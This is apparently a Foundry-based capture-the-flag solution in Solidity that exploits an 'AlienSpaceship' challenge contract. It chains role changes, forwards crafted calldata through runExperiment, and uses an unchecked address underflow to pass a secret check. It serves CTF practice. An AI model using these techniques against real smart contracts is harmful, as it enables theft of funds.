// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-ctf/CTFSolver.sol";
import "src/AlienSpaceship.sol";
import {Challenge} from "src/Challenge.sol";
import "forge-std/console.sol";

contract Exploit {
    Challenge private immutable CHALLENGE;
    AlienSpaceship public alienSpaceship;
    ExtraAccount public extraAccount;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;

        alienSpaceship = AlienSpaceship(address(CHALLENGE.ALIENSPACESHIP()));
        extraAccount = new ExtraAccount(address(alienSpaceship));

        alienSpaceship.applyForJob(alienSpaceship.ENGINEER());
        uint256 amountToDump = alienSpaceship.payloadMass() - 500e18 - 1;
        alienSpaceship.dumpPayload(amountToDump);
        alienSpaceship.runExperiment(abi.encodeWithSignature("applyForJob(bytes32)", alienSpaceship.ENGINEER()));
        alienSpaceship.quitJob();
        alienSpaceship.applyForJob(alienSpaceship.PHYSICIST());
        alienSpaceship.enableWormholes();
    }

    function exploit() external {
        alienSpaceship.applyForPromotion(alienSpaceship.CAPTAIN());
        uint160 _secret;
        unchecked {
            _secret = uint160(51) - uint160(address(this));
        }
        alienSpaceship.visitArea51(address(_secret));
        alienSpaceship.jumpThroughWormhole(100_000e18, 100_000e18, 100_000e18);
        extraAccount.applyForJob();
        extraAccount.dumpPayload();
        alienSpaceship.abortMission();
    }

    function empty() external {}
}

contract ExtraAccount {
    AlienSpaceship public alienSpaceship;

    constructor(address _alienSpaceship) {
        alienSpaceship = AlienSpaceship(_alienSpaceship);
    }

    function applyForJob() external {
        alienSpaceship.applyForJob(alienSpaceship.ENGINEER());
    }

    function dumpPayload() external {
        uint256 amountToDump = alienSpaceship.payloadMass() - 500e18 - 1e18;
        alienSpaceship.dumpPayload(amountToDump);
    }
}

contract Solve is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        console.log("solved?", challenge.isSolved());

        // First script run
        Exploit exploit = new Exploit(challenge);

        // Second script run 12 seconds (next block) after previous.
        // Exploit exploit = Exploit(0xf5868821F61985262F8EB90A22f2EB852066E9a1);

        // exploit.exploit();

        console.log("solved?", challenge.isSolved());
    }
}
